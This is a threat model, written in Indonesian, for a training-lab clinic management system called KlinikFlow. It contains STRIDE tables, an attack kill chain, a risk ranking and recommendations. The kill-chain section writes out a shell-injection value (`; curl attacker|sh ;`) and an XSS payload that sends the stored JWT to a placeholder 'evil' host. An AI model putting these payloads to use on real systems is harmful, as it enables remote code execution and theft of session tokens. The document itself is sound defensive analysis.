# Threat Model — KlinikFlow

> Dokumen ini disusun dari pembacaan kode pada commit `3c00cb0` (branch `main`).
> Lingkup: `web/`, `bun-api/`, `php-api/`, `database/`, `docker-compose.yml`.
> Klasifikasi data: **sintetis/dummy** (lab latihan), namun model ancaman disusun
> seolah data medis riil agar pola perbaikannya bisa dipakai ulang.

---

## 1. Ringkasan sistem

KlinikFlow adalah sistem administrasi klinik multi-tenant (contoh: Klinik Mentari,
Klinik Sehat Sentosa). Setiap entitas bisnis dipisahkan oleh `clinic_id`.

| Komponen | Teknologi | Peran |
|---|---|---|
| `web/` | Vue 3 + Vite + nginx | UI; menyimpan JWT di `localStorage`; proxy `/api/` ke `bun-api` |
| `bun-api/` | Bun + TypeScript | BFF/gateway: login, katalog layanan, pasien, kunjungan, tagihan, staf, dashboard |
| `php-api/` | PHP 8.3 + Apache | Layanan legacy: laporan, ekspor, klaim asuransi, lampiran berkas |
| `mysql` | MySQL 8.0 | Basis data relasional; seed dummy otomatis |

### 1.1 Alur data (DFD level 1)

```
┌──────────┐   HTTPS (Bearer JWT)   ┌──────────────┐   SQL (mysql2, prepared)   ┌────────┐
│  Browser │ ─────────────────────► │   bun-api    │ ─────────────────────────► │ MySQL  │
│  (Vue)   │ ◄───────────────────── │  :3000       │ ◄───────────────────────── │        │
└──────────┘                        └──────┬───────┘                            └────────┘
     ▲                                     │ HTTP (internal, header X-User-*)
     │  static assets                      ▼
┌────┴─────┐                        ┌──────────────┐   SQL (PDO, prepared)
│  nginx   │                        │   php-api    │ ──────────────────────────► MySQL
│  :8080   │                        │ :80 (apache) │
└──────────┘                        └──────────────┘
```

### 1.2 Trust boundary

| ID | Boundary | Catatan |
|---|---|---|
| TB1 | Internet/klien ↔ `web` + `bun-api:3000` | Tidak tepercaya. `bun-api` juga diekspos langsung (port 3000), melewati nginx |
| TB2 | `bun-api` ↔ `php-api` | Jaringan Docker internal, tapi **tanpa autentikasi antar-layanan**; kepercayaan penuh pada header `X-User-*` |
| TB3 | `bun-api`/`php-api` ↔ MySQL | Kredensial statis di compose; user DB punya hak penuh atas skema |
| TB4 | Penyimpanan di browser (`localStorage`) | Token JWT dapat dibaca JavaScript mana pun di origin yang sama |

### 1.3 Aset

| Aset | Dampak bila bocor/diubah |
|---|---|
| Data identitas pasien (nama, MRN, telepon, alamat, tanggal lahir) | Pelanggaran privasi data kesehatan (UU PDP) |
| Tarif layanan & item tagihan | Kerugian finansial langsung, sengketa tagihan |
| Faktur, pembayaran, status klaim asuransi | Manipulasi penerimaan, klaim ganda |
| Lampiran berkas klaim | Kebocoran dokumen medis/administratif |
| Akun staf & matriks role (`admin`, `manager`, `staff`, `cashier`, `patient`) | Eskalasi hak akses, takeover akun |
| Kredensial DB & `JWT_SECRET` | Kompromi total seluruh sistem |

---

## 2. Aktor & kemampuan

| Aktor | Kemampuan awal |
|---|---|
| A1 Anonim (internet) | Akses tanpa token ke endpoint yang tidak dijaga; hanya butuh URL |
| A2 Pasien terautentikasi | Token valid dengan `role=patient`, `clinic_id` miliknya |
| A3 Staf/kasir | Token valid `role=staff`/`cashier` |
| A4 Admin/manager klini lain | Token valid, klini berbeda (uji isolasi tenant) |
| A5 Penyerang dengan akses jaringan internal | Dapat memanggil `php-api` langsung (tanpa nginx/bun-api) |
| A6 Penyerang dengan `JWT_SECRET` | Dapat menempa token apa pun (lihat T-01) |

---

## 3. Analisis STRIDE per komponen

### 3.1 `bun-api` (BFF/gateway)

| Kategori | Ancaman | Temuan |
|---|---|---|
| **S**poofing | Secret JWT punya fallback hardcoded; token bisa ditempa bila env tidak di-set | F-01 |
| **T**ampering | `POST /api/services/fee` mengubah tarif tanpa cek role maupun `clinic_id` | F-02 |
| **R**epudiation | Tidak ada audit trail untuk perubahan tarif, pembayaran, approval klaim | F-12 |
| **I**nformation disclosure | `/api/patients`, `/api/visits`, `/api/invoices` tidak memerlukan autentikasi; error SQL dikembalikan apa adanya | F-03, F-13 |
| **D**enial of service | Login tanpa rate limit; query daftar tanpa paginasi | F-14, F-15 |
| **E**levation of privilege | `role` dari payload klien dipakai saat menerima undangan staf | F-04 |

### 3.2 `php-api` (layanan legacy)

| Kategori | Ancaman | Temuan |
|---|---|---|
| **S**poofing | Identitas (`X-User-Role`, `X-Clinic-Id`) dipercaya dari header tanpa verifikasi tanda tangan | F-05 |
| **T**ampering | `shell_exec()` menyusun perintah dari input `php://input` | F-06 |
| **R**epudiation | Approval klaim tidak mencatat siapa yang menyetujui | F-11 |
| **I**nformation disclosure | Daftar lampiran & detail klaim lintas klini; pesan exception PDO berisi host/user DB | F-07, F-13 |
| **D**enial of service | Endpoint ekspor tidak dibatasi | F-06 |
| **E**levation of privilege | Approval klaim tanpa cek role; klaim bisa di-approve berulang | F-08, F-11 |

### 3.3 `web` (Vue + nginx)

| Kategori | Ancaman | Temuan |
|---|---|---|
| **S**poofing | Token disimpan di `localStorage`, dapat dicuri lewat XSS | F-09 |
| **T**ampering | `v-html` merender data dari server tanpa sanitasi | F-09, F-10 |
| **I**nformation disclosure | Tidak ada CSP/security header di nginx | F-16 |

### 3.4 `database` & infrastruktur

| Kategori | Ancaman | Temuan |
|---|---|---|
| **S**poofing | Kredensial DB default di kode & compose (`klinikflow_pass`) | F-17 |
| **I**nformation disclosure | Seed memakai password seragam `password123` yang didokumentasikan di komentar SQL | F-18 |
| **E**levation of privilege | Aplikasi terhubung sebagai user DB dengan hak penuh (DROP/ALTER) | F-17 |

---

## 4. Skenario serangan berantai (kill chain)

1. **RCE tanpa autentikasi** — A1 memanggil `POST /api/reports/export` dengan `filter` berisi `; curl attacker|sh ;`.
   `export_report.php` menempelkannya ke `shell_exec()` → eksekusi perintah di container `php-api`.
   Dampak: kompromi container, akses ke `mysql` di jaringan internal (TB2/TB3).
2. **Ambil alih akun staf** — A1 membaca `GET /api/staff/invitations` (tanpa auth) → memperoleh `token`
   undangan → `POST /api/staff/accept-invitation` dengan `role: "admin"` → akun admin baru di klini korban.
3. **Manipulasi tarif** — A3 (kasir) memanggil `POST /api/services/fee` untuk menurunkan tarif tindakan
   menjadi Rp 0 sebelum membuat tagihan.
4. **Penggelembungan penerimaan** — A3 memanggil `POST /api/payments/process` berulang pada invoice
   yang sama; tidak ada pemeriksaan status, jadi tercatat banyak `payments` untuk satu tagihan.
5. **XSS berantai** — A2 mendaftarkan pasien dengan nama `<img src=x onerror=fetch('//evil/'+localStorage.klinikflow_token)>`;
   admin membuka halaman Pasien → token admin dicuri → seluruh data klini dapat diakses.

---

## 5. Peringkat risiko

| Peringkat | Temuan | Alasan |
|---|---|---|
| **Critical** | F-06 (RCE), F-05 + F-04 (takeover staf via header/role) | Eksekusi kode & eskalasi ke admin |
| **High** | F-01 (JWT secret), F-02 (IDOR tarif), F-03 (PII tanpa auth), F-07 (BOLA lampiran/klaim), F-08 (approval klaim), F-09/F-10 (XSS → token theft) | Akses/ubah data lintas tenant dan pengambilalihan akun |
| **Medium** | F-11 (replay klaim/pembayaran), F-12 (tanpa audit), F-13 (error bocor), F-14 (brute force), F-17 (kredensial default), F-18 (seed password) | Butuh kondisi tambahan, dampak tetap material |
| **Low** | F-15 (DoS query), F-16 (security header), F-19 (identifier predictable), F-20 (node_modules ter-commit) | Mempermudah serangan lain / higiene |

---

## 6. Asumsi & batasan

- Tidak ada WAF, rate limiter, atau API gateway di depan aplikasi; nginx hanya menyajikan aset statis dan mem-proxy `/api/`.
- Seluruh layanan berjalan di satu host Docker; kompromi satu container memberi akses ke jaringan internal.
- Klasifikasi data: sintetis. Temuan tetap diperlakukan serius karena polanya identik dengan sistem produksi.
- Model ancaman ini **tidak** mencakup: keamanan image Docker upstream, kerentanan dependensi (perlu `bun audit`/`composer audit` terpisah), dan keamanan host/OS.

## 7. Rekomendasi strategis (di luar patch)

1. Terapkan **defense in depth**: verifikasi otorisasi di setiap layanan, jangan hanya di gateway.
2. Jangan pernah mengekspos `bun-api:3000` langsung ke host; semua trafik lewat nginx.
3. Tambahkan audit log terpusat untuk aksi sensitif (tarif, pembayaran, approval klaim, perubahan role).
4. Simpan token di cookie `HttpOnly` + `SameSite=Strict` bila arsitektur memungkinkan, atau pertahankan `localStorage` dengan CSP ketat.
5. Jadwalkan pemindaian dependensi dan rotasi kredensial.
